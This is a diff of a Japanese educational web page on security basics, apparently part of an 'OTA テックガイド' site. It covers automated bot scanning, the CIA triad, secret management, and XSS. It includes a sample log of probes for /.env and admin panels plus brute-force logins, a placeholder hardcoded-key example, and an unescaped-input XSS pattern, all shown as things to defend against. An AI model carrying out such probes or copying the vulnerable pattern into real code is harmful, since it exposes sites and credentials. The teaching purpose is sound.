@@ -29,7 +29,7 @@
     
     
       
-        <title>セキュリティ - OTA テックガイド</title>
+        <title>セキュリティ基礎 - OTA テックガイド</title>
       
     
     
@@ -125,7 +125,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              セキュリティ
+              セキュリティ基礎
             
           </span>
         </div>
@@ -4617,17 +4617,6 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#web" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        なぜ Web セキュリティが重要か
-      </span>
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
   <a href="#_2" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
@@ -4667,10 +4656,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#https" class="md-nav__link">
+  <a href="#_5" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
-        HTTPS（暗号化通信）
+        攻撃は自動でやってくる
       </span>
     </span>
   </a>
@@ -4678,7 +4667,18 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_5" class="md-nav__link">
+  <a href="#3cia" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        守るべき3つの性質（CIA）
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
         秘密情報の管理（最重要）
@@ -4690,132 +4690,10 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#git" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        絶対に Git にコミットしてはいけないもの
-      </span>
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#env" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        .env ファイルを使う
-      </span>
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#github-secretscicd" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        GitHub Secrets（CI/CD での秘密情報）
-      </span>
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#web_1" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        よくある Web の脆弱性
-      </span>
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="よくある Web の脆弱性">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#xss" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        XSS（クロスサイトスクリプティング）
-      </span>
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#csrf" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        CSRF（クロスサイトリクエストフォージェリ）
-      </span>
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_6" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        依存パッケージの脆弱性
-      </span>
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#npm-audit" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        npm audit の出力を読む
-      </span>
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#dependabotgithub" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        Dependabot（GitHub の自動脆弱性検出）
-      </span>
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
   <a href="#_7" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
-        アクセス権限の管理
-      </span>
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="アクセス権限の管理">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#github" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        GitHub の権限設定
+        ❌ これをやると詰む
       </span>
     </span>
   </a>
@@ -4826,7 +4704,29 @@
   <a href="#_8" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
-        不要になったアクセスの削除
+        ✅ 正しい管理方法
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        やってしまったときの対処
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cicd" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        CI/CD での秘密情報の渡し方
       </span>
     </span>
   </a>
@@ -4839,22 +4739,139 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_9" class="md-nav__link">
+  <a href="#https" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
-        パスワード・アカウント管理
+        HTTPS（通信の暗号化）
       </span>
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="パスワード・アカウント管理">
+    <nav class="md-nav" aria-label="HTTPS（通信の暗号化）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#http-vs-https" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        HTTP vs HTTPS
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        XSS（クロスサイトスクリプティング）
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XSS（クロスサイトスクリプティング）">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
   <a href="#_10" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
-        強力なパスワードを使う
+        何をされる攻撃か
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        なぜ起きるか・どう防ぐか
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#csrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        CSRF（クロスサイトリクエストフォージェリ）
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="CSRF（クロスサイトリクエストフォージェリ）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        何をされる攻撃か
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        防御策
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        依存パッケージの脆弱性
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        アカウント・権限の管理
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="アカウント・権限の管理">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        パスワード管理
       </span>
     </span>
   </a>
@@ -4872,13 +4889,24 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        最小権限の原則
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_11" class="md-nav__link">
+  <a href="#_18" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
         セキュリティチェックリスト
@@ -4889,18 +4917,7 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_12" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        よくある疑問
-      </span>
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_13" class="md-nav__link">
+  <a href="#_19" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
         確認問題
@@ -4911,7 +4928,7 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_14" class="md-nav__link">
+  <a href="#_20" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
         関連ページ
@@ -5391,17 +5408,6 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#web" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        なぜ Web セキュリティが重要か
-      </span>
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
   <a href="#_2" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
@@ -5441,10 +5447,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#https" class="md-nav__link">
+  <a href="#_5" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
-        HTTPS（暗号化通信）
+        攻撃は自動でやってくる
       </span>
     </span>
   </a>
@@ -5452,7 +5458,18 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_5" class="md-nav__link">
+  <a href="#3cia" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        守るべき3つの性質（CIA）
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
         秘密情報の管理（最重要）
@@ -5464,132 +5481,10 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#git" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        絶対に Git にコミットしてはいけないもの
-      </span>
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#env" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        .env ファイルを使う
-      </span>
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#github-secretscicd" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        GitHub Secrets（CI/CD での秘密情報）
-      </span>
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#web_1" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        よくある Web の脆弱性
-      </span>
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="よくある Web の脆弱性">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#xss" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        XSS（クロスサイトスクリプティング）
-      </span>
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#csrf" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        CSRF（クロスサイトリクエストフォージェリ）
-      </span>
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_6" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        依存パッケージの脆弱性
-      </span>
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#npm-audit" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        npm audit の出力を読む
-      </span>
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#dependabotgithub" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        Dependabot（GitHub の自動脆弱性検出）
-      </span>
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
   <a href="#_7" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
-        アクセス権限の管理
-      </span>
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="アクセス権限の管理">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#github" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        GitHub の権限設定
+        ❌ これをやると詰む
       </span>
     </span>
   </a>
@@ -5600,7 +5495,29 @@
   <a href="#_8" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
-        不要になったアクセスの削除
+        ✅ 正しい管理方法
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        やってしまったときの対処
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cicd" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        CI/CD での秘密情報の渡し方
       </span>
     </span>
   </a>
@@ -5613,22 +5530,139 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_9" class="md-nav__link">
+  <a href="#https" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
-        パスワード・アカウント管理
+        HTTPS（通信の暗号化）
       </span>
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="パスワード・アカウント管理">
+    <nav class="md-nav" aria-label="HTTPS（通信の暗号化）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#http-vs-https" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        HTTP vs HTTPS
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        XSS（クロスサイトスクリプティング）
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XSS（クロスサイトスクリプティング）">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
   <a href="#_10" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
-        強力なパスワードを使う
+        何をされる攻撃か
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        なぜ起きるか・どう防ぐか
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#csrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        CSRF（クロスサイトリクエストフォージェリ）
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="CSRF（クロスサイトリクエストフォージェリ）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        何をされる攻撃か
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        防御策
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        依存パッケージの脆弱性
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        アカウント・権限の管理
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="アカウント・権限の管理">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        パスワード管理
       </span>
     </span>
   </a>
@@ -5646,13 +5680,24 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        最小権限の原則
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_11" class="md-nav__link">
+  <a href="#_18" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
         セキュリティチェックリスト
@@ -5663,18 +5708,7 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_12" class="md-nav__link">
-    <span class="md-ellipsis">
-      <span class="md-typeset">
-        よくある疑問
-      </span>
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_13" class="md-nav__link">
+  <a href="#_19" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
         確認問題
@@ -5685,7 +5719,7 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_14" class="md-nav__link">
+  <a href="#_20" class="md-nav__link">
     <span class="md-ellipsis">
       <span class="md-typeset">
         関連ページ
@@ -5710,233 +5744,276 @@
                 
                   
 
-<h1 id="_1">セキュリティ<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
-<h2 id="web">なぜ Web セキュリティが重要か<a class="headerlink" href="#web" title="Permanent link">&para;</a></h2>
-<p>Web サイトを公開するということは、世界中の人からアクセスできる状態にすることです。悪意のある人間がサイトを攻撃したり、情報を盗もうとすることがあります。</p>
-<p>「自分たちのサイトは小さいから大丈夫」は危険な考えです。多くの攻撃は自動化されており、規模に関係なく標的になります。</p>
+<h1 id="_1">セキュリティ基礎<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p><strong>「自分のサイトは小さいから大丈夫」は最も危険な思い込みです。</strong> 攻撃の大半は人間が手動でやっているのではなく、ボットが自動で無差別にスキャンしています。公開した翌日にはすでに試されています。</p>
 <hr />
 <h2 id="_2">はじめて読む人へ<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
-<p>セキュリティは、攻撃者だけを意識するものではありません。うっかり秘密情報を公開しない、不要な権限を渡さない、依存パッケージを放置しない、といった日常の習慣が基本になります。</p>
+<p>セキュリティというと「ハッカー対策」というイメージがありますが、実際に多い被害の原因は「パスワードをコードに書いた」「パッケージを更新していなかった」「設定を間違えた」といった、ちょっとした不注意です。このページでは「知らないと必ずやらかす」基本事項を整理します。</p>
 <h3 id="_3">読む前に押さえること<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
 <ul>
-<li>公開されたWebサイトは、自動化された攻撃の対象になります。</li>
-<li>秘密情報はコードではなく環境変数やSecretsで管理します。</li>
-<li>最小権限にすると、ミスや攻撃の被害範囲を小さくできます。</li>
+<li><a href="../環境構築/">環境構築</a> — <code>.env</code> ファイルの役割</li>
+<li><a href="../Git/">Git / GitHub</a> — コミット・プッシュの仕組み（なぜ履歴が危険か）</li>
 </ul>
 <h3 id="_4">読み終えたら説明できること<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
 <ul>
-<li>HTTPS、秘密情報、権限管理の基本を説明できる。</li>
-<li><code>.env</code> を Git に含めてはいけない理由を説明できる。</li>
-<li>XSS や CSRF の大まかな危険性を理解できる。</li>
+<li><code>.env</code> を GitHub にプッシュしてはいけない理由を説明できる</li>
+<li>XSS・CSRF が「何をされる攻撃か」を言葉で説明できる</li>
+<li>自分のプロジェクトのセキュリティチェックリストを実行できる</li>
 </ul>
 <hr />
-<h2 id="https">HTTPS（暗号化通信）<a class="headerlink" href="#https" title="Permanent link">&para;</a></h2>
-<blockquote>
-<p><strong>情報工学メモ：暗号化の仕組み（対称暗号・非対称暗号の違い、RSA・AES）</strong><br />
-暗号化には大きく 2 種類あります。<strong>対称暗号</strong> は暗号化と復号に同じ鍵を使う方式で、処理が高速です（代表例：<strong>AES</strong>）。ただし「鍵をどうやって安全に相手に渡すか」という問題があります。<strong>非対称暗号</strong>（公開鍵暗号）は「公開鍵で暗号化し、対応する秘密鍵でしか復号できない」方式で、公開鍵は誰に渡しても安全です（代表例：<strong>RSA</strong>）。HTTPS（TLS）ではまず非対称暗号を使って共通鍵を安全に交換し、その後の通信は高速な対称暗号（AES）で行うというハイブリッド方式を採用しています。</p>
-</blockquote>
-<p>サイトを HTTPS で提供することが、最も基本的なセキュリティ対策です。</p>
-<blockquote>
-<p>HTTPS の仕組みは <a href="../ネットワーク基礎/">ネットワーク基礎</a> ページで解説しています。</p>
-</blockquote>
-<p>Cloudflare Pages にデプロイすると、<strong>自動的に HTTPS が有効になります</strong>。追加の設定は不要です。</p>
-<p>ブラウザのアドレスバーに 🔒 マークが表示されていれば OK です。</p>
+<h2 id="_5">攻撃は自動でやってくる<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<p>インターネット上のサーバーは、公開した瞬間からスキャンされます。</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>2024-01-15 03:22:11 GET /wp-admin/             → WordPress の管理画面を探している
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>2024-01-15 03:22:12 GET /phpmyadmin/           → phpMyAdmin を探している
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>2024-01-15 03:22:13 GET /.env                  → 環境変数ファイルを盗もうとしている
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>2024-01-15 03:22:14 GET /admin/                → 管理画面を探している
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>2024-01-15 03:22:15 POST /api/login            → パスワードを総当たり（ブルートフォース）
+</span></code></pre></div>
+<p>これは実際のサーバーログによく見られるパターンです。攻撃者ではなくボットが、世界中のサーバーに対して自動で試しています。「うちのサイトには価値がない」は関係ありません。</p>
+<p><strong>狙われるもの：</strong>
+- <code>.env</code> ファイル（API キー・DB パスワードが丸ごと手に入る）
+- 管理画面（乗っ取れれば何でもできる）
+- 既知の脆弱性があるバージョンのソフトウェア</p>
 <hr />
-<h2 id="_5">秘密情報の管理（最重要）<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
-<p>秘密情報とは、知らない人に見られると悪用される値のことです。API キー、DB パスワード、アクセストークンなどは、コードそのものとは違い、外へ漏れると実際のサービスやデータにアクセスされる危険があります。</p>
-<p>重要なのは、秘密情報を「あとで消せばよい」と考えないことです。GitHub に一度 push すると履歴に残るため、削除コミットだけでは不十分です。漏れたキーは無効化して作り直します。</p>
-<h3 id="git">絶対に Git にコミットしてはいけないもの<a class="headerlink" href="#git" title="Permanent link">&para;</a></h3>
-<p>以下の情報をコードに直接書いて GitHub にプッシュすると、世界中から見られてしまいます。</p>
-<ul>
-<li>API キー・シークレットキー</li>
-<li>パスワード</li>
-<li>データベースの接続情報</li>
-<li>アクセストークン</li>
-</ul>
-<h3 id="env">.env ファイルを使う<a class="headerlink" href="#env" title="Permanent link">&para;</a></h3>
-<p>秘密情報は <strong><code>.env</code></strong> ファイルに書き、<code>.gitignore</code> で Git 管理から除外します。</p>
-<p><code>.env</code> は、ローカル開発用の環境変数を書くファイルです。API キーや DB 接続情報のように、環境ごとに違う値や外に見せてはいけない値を入れます。</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># .env ファイル（Git には含めません）</span>
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nv">API_KEY</span><span class="o">=</span>your_secret_key_here
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nv">DATABASE_URL</span><span class="o">=</span>postgresql://user:password@localhost/db
-</span></code></pre></div>
-<p>この例では、<code>API_KEY</code> と <code>DATABASE_URL</code> が秘密情報です。値そのものは自分の PC にだけ置き、GitHub へ push しません。</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># .gitignore に追記します（このファイルは Git に含まれます）</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>.env
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>.env.local
-</span></code></pre></div>
-<p><code>.gitignore</code> に書くことで、Git は <code>.env</code> を変更ファイルとして扱わなくなります。秘密情報を守るには、<code>.env</code> を作るだけでなく、Git に含まれない設定まで確認する必要があります。</p>
-<blockquote>
-<p><strong><code>.env</code> ファイルが既に GitHub にプッシュされてしまった場合</strong><br />
-そのキー・パスワードは即座に無効化・再発行してください。Git の履歴から削除するだけでは不十分です（履歴は残るため）。</p>
-</blockquote>
-<h3 id="github-secretscicd">GitHub Secrets（CI/CD での秘密情報）<a class="headerlink" href="#github-secretscicd" title="Permanent link">&para;</a></h3>
-<p>GitHub Actions や Cloudflare Pages で環境変数を使う場合、<strong>GitHub Secrets</strong> または <strong>Cloudflare の環境変数設定</strong> を使います。</p>
-<p><strong>Cloudflare Pages での設定：</strong>
-1. ダッシュボード → Pages プロジェクト → <strong>Settings</strong> → <strong>Environment variables</strong>
-2. 変数名と値を入力して保存します</p>
-<p>コードには変数名だけを書きます。</p>
-<p>コード側では、秘密情報の実際の値ではなく、環境変数名を参照します。実際の値は GitHub や Cloudflare の設定画面に保存します。</p>
-<div class="language-js highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">apiKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">API_KEY</span><span class="p">;</span><span class="w">  </span><span class="c1">// 実際の値はコードに書きません</span>
-</span></code></pre></div>
-<p>この形にすると、開発環境・プレビュー環境・本番環境で別々の API キーを使えます。漏洩時も、該当する環境のキーだけを無効化できます。</p>
+<h2 id="3cia">守るべき3つの性質（CIA）<a class="headerlink" href="#3cia" title="Permanent link">&para;</a></h2>
+<p>情報セキュリティの目標は次の3つです。</p>
+<table>
+<thead>
+<tr>
+<th>性質</th>
+<th>意味</th>
+<th>身近な例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>機密性 C</strong>onfidentiality</td>
+<td>許可された人だけが見られる</td>
+<td>パスワードは自分しか知らない</td>
+</tr>
+<tr>
+<td><strong>完全性 I</strong>ntegrity</td>
+<td>データが改ざんされていない</td>
+<td>注文金額が勝手に変わらない</td>
+</tr>
+<tr>
+<td><strong>可用性 A</strong>vailability</td>
+<td>必要なときに使える</td>
+<td>サービスが落ちていない</td>
+</tr>
+</tbody>
+</table>
 <hr />
-<h2 id="web_1">よくある Web の脆弱性<a class="headerlink" href="#web_1" title="Permanent link">&para;</a></h2>
-<h3 id="xss">XSS（クロスサイトスクリプティング）<a class="headerlink" href="#xss" title="Permanent link">&para;</a></h3>
-<p>悪意のある JavaScript をページに埋め込む攻撃です。</p>
-<p><strong>悪い例（ユーザー入力をそのまま表示）：</strong></p>
-<p>次のようにユーザー入力をそのまま HTML として扱うと、入力に悪意あるスクリプトが含まれていた場合に実行される危険があります。</p>
-<div class="language-html highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="cm">&lt;!-- ユーザーが入力した値を直接 HTML に埋め込む → 危険 --&gt;</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>{userInput}<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+<h2 id="_6">秘密情報の管理（最重要）<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<h3 id="_7">❌ これをやると詰む<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># こういうコードを GitHub に push した瞬間、詰みです</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="n">OPENAI_API_KEY</span> <span class="o">=</span> <span class="s2">&quot;sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="n">DATABASE_URL</span>   <span class="o">=</span> <span class="s2">&quot;postgresql://user:password@db.example.com/prod&quot;</span>
 </span></code></pre></div>
-<p><strong>Astro でのケア：</strong><br />
-Astro はデフォルトで <code>{変数}</code> の内容を <strong>エスケープ</strong>（無害化）してくれます。HTML をそのまま埋め込む <code>set:html</code> を使うときだけ注意が必要です。</p>
